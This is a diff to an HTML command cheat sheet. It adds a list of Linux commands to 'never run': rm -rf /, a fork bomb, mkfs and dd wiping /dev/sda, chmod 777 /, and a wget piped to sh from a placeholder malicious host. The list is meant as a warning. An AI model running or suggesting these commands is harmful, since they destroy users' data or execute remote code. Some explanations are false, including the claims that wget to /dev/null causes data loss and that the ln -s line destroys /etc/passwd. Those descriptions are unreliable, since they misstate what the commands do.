@@ -91,7 +91,7 @@ Topic contains:
 </ul>
   
 <h3 id='n1.3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Linux </ins></h3>
-<a href='https://explainshell.com/'> ExplainShell</a>. Provides a convenient interface for searching help information for any command
+<a href='https://explainshell.com/'> ExplainShell</a> - provides a convenient interface for searching help information for any command
 <h4> &nbsp;&nbsp;&nbsp; Commands to find </h4>
 	<ul>
 		<li> Find all files in / directory (-type d for find dirs):
@@ -108,6 +108,31 @@ Topic contains:
 		<li> To allow traffic routing on your part (Main rule for MITM)
 			<p> <pre><code> sudo sysctl -w net.ipv4.ip_forward=1 </code></pre>
 	</ul>
+ <h4> &nbsp;&nbsp;&nbsp; Never run these Linux commands: </h4>
+ 	<ul>
+		<li> This command will delete all files and folders on your computer: 
+			<pre><code> rm -rf /  </code></pre>
+		<li> Also known as a "fork bomb", this command can cause a memory overflow on your computer and lead to system crash:
+			<pre><code> :(){ :|: & };: </code></pre>
+		<li> This command formats the hard drive without any warning or confirmation. All data will be lost:
+			<pre><code> mkfs.ext4 /dev/sda </code></pre>
+		<li> This command overwrites all data on the hard drive with random values, resulting in data loss:
+			<pre><code> dd if=/dev/random of=/dev/sda </code></pre>
+		<li> This command grants full access to your file system for all users, which can compromise security:
+			<pre><code> chmod 777 / </code></pre>
+		<li> This command moves all files in your home directory to "null", effectively deleting them:
+			<pre><code> mv /home/* /dev/null </code></pre>
+		<li> This command downloads a file and overwrites all data in "null", resulting in data loss:
+			<pre><code> wget http://example.com/file -O /dev/null </code></pre>
+		<li> This command formats the hard drive partition without any warning or confirmation. All data on this partition will be lost:
+			<pre><code> mkfs.ext4 /dev/sda1 </code></pre>
+		<li> This command creates a symbolic link to "/etc/passwd" in "null", resulting in data loss:
+			<pre><code> ln -s /dev/null /etc/passwd </code></pre>
+		<li> This will replace your partition containing all the necessary data for booting the system with the string "Hello":
+			<pre><code> echo "Hello" > /dev/sda </code></pre>
+		<li> Such commands will download and execute malicious scripts on your system, potentially compromising your system's security:
+			<pre><code> wget http://malicious_source -O- | sh </code></pre>
+  	</ul>
 
 <h3 id='n1.4'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Windows </ins></h3>
 <h4> &nbsp;&nbsp;&nbsp; Commands to find </h4>
